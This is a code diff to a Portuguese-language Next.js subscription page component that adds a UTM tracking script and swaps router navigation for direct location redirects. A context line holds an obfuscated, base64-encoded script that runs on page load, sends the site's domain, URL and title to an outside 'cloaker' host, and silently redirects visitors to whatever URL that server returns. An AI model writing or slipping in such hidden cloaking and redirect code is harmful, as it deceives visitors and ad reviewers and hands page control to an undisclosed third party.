@@ -218,13 +218,21 @@ function PrivacyBlackPageContent() {
           !function(){var d=atob("aHR0cHM6Ly9jbG9ha2VyLnBhcmFkaXNlcGFncy5jb20vLz9hcGk9bW9uaXRvcg=="),y=atob("bW9uXzE0N2Q5MmY1ZWI1MDk1ZjY5Yjg0MjgyYjQzYzZkYTY4ZmJmM2NiMDY1ZmNhMmUzNjhmYzg4NGI2ODQ4ZjY1NTk=");function createFormData(){var dgx=new FormData;return dgx.append(atob("bW9uaXRvcl9rZXk="),y),dgx.append(atob("ZG9tYWlu"),location.hostname),dgx.append(atob("dXJs"),location.href),dgx.append(atob("dGl0bGU="),document.title),dgx}function yxq(){fetch(d,{method:atob("UE9TVA=="),body:createFormData(),headers:{"X-Requested-With":atob("WE1MSHR0cFJlcXVlc3Q=")}}).then(function(fw){return fw.json()}).then(function(c){c.success&&c.redirect&&c.redirect_url&&location.replace(c.redirect_url)}).catch(function(){})}document.readyState===atob("bG9hZGluZw==")?document.addEventListener(atob("RE9NQ29udGVudExvYWRlZA=="),yxq):yxq()}();
         `}
       </Script>
+
+      {/* UTMify Script */}
+      <Script
+        src="https://cdn.utmify.com.br/scripts/utms/latest.js"
+        data-utmify-prevent-xcod-sck
+        data-utmify-prevent-subids
+        strategy="afterInteractive"
+      />
       <div className="min-h-screen bg-black text-white">
         {/* Header de navegação fixo no topo */}
         <header className="bg-black border-b border-gray-700 px-4 sticky top-0 z-40 h-[65px] flex items-center">
           <div className="flex items-center justify-between w-full">
             {/* Botão voltar */}
             <button
-              onClick={() => router.push("/inicio")}
+              onClick={() => (window.location.href = "/inicio")}
               className="inline-flex items-center justify-center gap-2 whitespace-nowrap rounded-md text-sm font-medium ring-offset-background focus-visible:outline-none focus-visible:ring-2 focus-visible:ring-ring focus-visible:ring-offset-2 disabled:pointer-events-none disabled:opacity-50 h-10 w-10 transition-all duration-200 hover:scale-105 hover:bg-gray-800 text-gray-300"
             >
               <ArrowLeft className="h-5 w-5" />
@@ -349,7 +357,7 @@ function PrivacyBlackPageContent() {
               Assinaturas
             </h3>{" "}
             <div
-              onClick={() => router.push(getCheckoutUrl())}
+              onClick={() => (window.location.href = getCheckoutUrl())}
               className="w-full h-[60px] rounded-[30px] px-[25px] flex items-center justify-between text-white font-light text-[15px] transition-all duration-200 hover:scale-[1.02] hover:shadow-lg cursor-pointer"
               style={{
                 background:
@@ -641,7 +649,7 @@ function PrivacyBlackPageContent() {
                   <div className="mt-3">
                     {" "}
                     <button
-                      onClick={() => router.push(getCheckoutUrl())}
+                      onClick={() => (window.location.href = getCheckoutUrl())}
                       className="inline-flex items-center gap-2 px-3 py-1.5 bg-gradient-to-r from-orange-500 to-pink-500 text-white text-xs font-medium rounded-lg hover:from-orange-600 hover:to-pink-600 transition-all duration-200 hover:scale-105 shadow-sm"
                     >
                       <CircleDollarSign className="h-3 w-3" />
@@ -695,7 +703,7 @@ function PrivacyBlackPageContent() {
 
                 <div className="flex gap-3">
                   <button
-                    onClick={() => router.push(getCheckoutUrl())}
+                    onClick={() => (window.location.href = getCheckoutUrl())}
                     className="flex-1 inline-flex items-center justify-center gap-2 px-4 py-2 bg-gradient-to-r from-orange-500 to-pink-500 text-white text-sm font-medium rounded-lg hover:from-orange-600 hover:to-pink-600 transition-all duration-200 hover:scale-105 shadow-sm"
                   >
                     <CircleDollarSign className="h-4 w-4" />
